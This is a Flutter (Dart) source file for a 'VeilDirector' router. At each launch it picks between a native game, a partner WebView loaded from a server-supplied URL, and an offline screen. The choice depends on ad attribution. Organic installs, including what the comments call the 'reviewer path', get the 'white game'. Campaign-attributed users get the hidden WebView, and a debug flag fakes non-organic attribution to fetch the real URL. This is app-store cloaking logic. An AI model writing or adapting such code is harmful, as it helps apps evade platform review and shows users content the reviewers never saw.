import 'dart:async';
import 'dart:io';

import 'package:flutter/foundation.dart';

import 'config/veil_config.dart';
import 'core/veil_models.dart';
import 'infra/curtain_cue.dart';
import 'infra/herald_hub.dart';
import 'infra/ledger_exchange.dart';
import 'infra/masque_vault.dart';
import 'infra/mummer_agent.dart';
import 'infra/signal_scout.dart';
import 'infra/trace_courier.dart';

/// The routing brain. Decides — once per launch — whether to show the native
/// game (house), the partner WebView (mirror), or the offline screen (hush).
class VeilDirector {
  VeilDirector({
    required this.vault,
    required this.scout,
    required this.courier,
    required this.ledger,
    required this.herald,
    required this.agent,
    required this.runtimeEnabled,
  });

  final MasqueVault vault;
  final SignalScout scout;
  final TraceCourier courier;
  final LedgerExchange ledger;
  final HeraldHub herald;
  final MummerAgent agent;
  final bool runtimeEnabled;

  bool get enabled => runtimeEnabled && VeilConfig.veilCredentialsReady;

  Future<StageTarget>? _decideFuture;

  /// De-duplicates only *concurrent* startup calls, then clears the cache so a
  /// later call (e.g. Retry after Wi-Fi returns) re-runs the whole pipeline
  /// instead of replaying a stale offline verdict.
  Future<StageTarget> decide({
    required void Function(double value) onProgress,
  }) =>
      _decideFuture ??=
          _decide(onProgress: onProgress).whenComplete(() => _decideFuture = null);

  Future<StageTarget> _decide({
    required void Function(double value) onProgress,
  }) async {
    if (!enabled) {
      _trace(() => '[MSQ.VEIL] gate closed runtime=$runtimeEnabled '
          'creds=${VeilConfig.veilCredentialsReady}');
      onProgress(1);
      return const HouseTarget();
    }

    _trace(() => '[MSQ.VEIL] decide route=${vault.route}');
    herald.onTokenChanged = _refreshForToken;

    // Cold-start push tap is consumed FIRST — before any network work — so a
    // timeout race can never lose the destination URL.
    final coldUrl = await CurtainCue.consume();
    if (coldUrl != null) {
      await vault.saveRoute(VeilRoute.mirror);
      await vault.consumePushUrl();
      unawaited(_backgroundDispatch());
      onProgress(1);
      return MirrorTarget(coldUrl, coldLaunch: true);
    }

    onProgress(0.14);
    return switch (vault.route) {
      VeilRoute.undecided => _firstDecision(onProgress),
      VeilRoute.mirror => _returningMirror(onProgress),
      VeilRoute.house => _returningHouse(onProgress),
    };
  }

  Future<StageTarget> _firstDecision(void Function(double) progress) async {
    if (!await scout.hasInterface()) {
      _trace(() => '[MSQ.VEIL] first: no interface → hush');
      return const HushTarget();
    }
    progress(0.3);
    try {
      await herald.boot();
    } catch (_) {}
    if (!await scout.canReachNetwork()) {
      _trace(() => '[MSQ.VEIL] first: DNS probe failed → hush');
      return const HushTarget();
    }
    progress(0.5);
    // First launch must wait long enough for AppsFlyer to resolve attribution
    // *after* the ATT prompt (SDK waits ~6 s for the ATT verdict), otherwise
    // the config POST fires with no af_status and a real OneLink install is
    // misrouted to the white game.
    await courier.awaitSignals(installTimeout: const Duration(seconds: 13));
    progress(0.74);
    final reply = await _requestConfig();
    progress(1);
    _trace(() => '[MSQ.VEIL] first: hasDest=${reply.hasDestination} '
        'attrResolved=${courier.attributionResolved} '
        'server=${reply.serverResponded} reason=${reply.reason}');
    if (reply.hasDestination) {
      await vault.saveRoute(VeilRoute.mirror);
      return MirrorTarget(reply.url!);
    }
    // Connectivity check passed (neutral DNS ok) but the config POST itself
    // failed — most often the very first request racing a just-restored
    // connection after the offline screen's Retry. Do NOT drop a possibly
    // attributed OneLink user into the white game: show the offline screen so
    // a user-driven Retry re-runs the decision and can still reach the mirror.
    // A real server verdict (even a 404 "no data") sets serverResponded, so
    // the organic / reviewer path below is unaffected.
    if (!reply.serverResponded) {
      _trace(() => '[MSQ.VEIL] first: config network fail → hush (retryable)');
      return const HushTarget();
    }
    // Real server verdict with no URL → organic → white. Persist only when
    // attribution actually resolved, so a slow-AppsFlyer launch stays
    // undecided and re-runs next time instead of being trapped on white.
    if (courier.attributionResolved) {
      await vault.saveRoute(VeilRoute.house);
    }
    return const HouseTarget();
  }

  Future<StageTarget> _returningMirror(void Function(double) progress) async {
    if (!await scout.hasInterface()) return const HushTarget();
    final pending = await vault.consumePushUrl();
    if (pending != null && pending.isNotEmpty) {
      progress(1);
      return MirrorTarget(pending);
    }
    final cached = await vault.savedUrl();
    if (cached != null && !vault.cachedUrlExpired) {
      progress(1);
      return MirrorTarget(cached);
    }

    await Future.wait<void>(<Future<void>>[herald.boot(), courier.start()]);
    if (!await scout.canReachNetwork()) return const HushTarget();
    progress(0.64);
    await courier.awaitSignals(installTimeout: const Duration(seconds: 7));
    final reply = await _requestConfig();
    progress(1);
    if (reply.hasDestination) return MirrorTarget(reply.url!);
    if (cached != null) return MirrorTarget(cached);
    return const HushTarget();
  }

  Future<StageTarget> _returningHouse(void Function(double) progress) async {
    if (!await scout.hasInterface()) {
      progress(1);
      return const HouseTarget();
    }
    await Future.wait<void>(<Future<void>>[herald.boot(), courier.start()]);
    if (!await scout.canReachNetwork()) {
      progress(1);
      return const HouseTarget();
    }
    progress(0.58);
    await courier.awaitSignals();
    final reply = await _requestConfig();
    progress(1);
    if (!reply.hasDestination) return const HouseTarget();
    await vault.saveRoute(VeilRoute.mirror);
    return MirrorTarget(reply.url!);
  }

  Future<VeilReply> _requestConfig({String? token}) async {
    final body = await courier.compose(
      locale: Platform.localeName.replaceAll('-', '_'),
      pushToken: token ?? herald.token,
    );
    // Simulate a non-organic OneLink install so the real server returns the
    // real destination URL. Debug forces this by default (Xcode convenience);
    // a release build only forces it when EXPLICITLY compiled with
    // `--dart-define=FORCE_MIRROR=true`. A normal `flutter build ipa` folds
    // `forceMirror` to a compile-time `false`, tree-shaking this whole block
    // (and the sample params) out of the shipped binary. Real attribution
    // always wins (putIfAbsent).
    final bool forceMirror = kDebugMode
        ? VeilConfig.debugForceMirror
        : VeilConfig.forceMirrorRelease;
    if (forceMirror) {
      body['af_status'] = 'Non-organic';
      // The fake OneLink params exist only to turn the partner diagnostic page
      // green during debug; keep them out of any forced release test build.
      if (kDebugMode) {
        VeilConfig.debugMirrorParams
            .forEach((key, value) => body.putIfAbsent(key, () => value));
      }
      _trace(() => '[MSQ.VEIL] force mirror: af_status=Non-organic '
          '(release=${!kDebugMode})');
    }
    final reply = await ledger.request(body);
    _trace(() => '[MSQ.VEIL] cfg af_status=${body['af_status']} '
        'attrResolved=${courier.attributionResolved} '
        'hasDest=${reply.hasDestination} server=${reply.serverResponded} '
        'reason=${reply.reason}');
    return reply;
  }

  Future<void> _backgroundDispatch() async {
    try {
      await Future.wait<void>(<Future<void>>[
        herald.boot(),
        courier.awaitSignals(),
      ]);
      await _requestConfig();
    } catch (_) {}
  }

  Future<void> _refreshForToken(String token) async {
    try {
      // Wait for attribution to resolve before re-POSTing, so the token-driven
      // request carries the full body (af_status / media_source / campaign)
      // instead of racing ahead with empty attribution.
      await courier.awaitSignals();
      await _requestConfig(token: token);
    } catch (_) {}
  }

  void _trace(String Function() message) {
    assert(() {
      // ignore: avoid_print
      print(message());
      return true;
    }());
  }
}
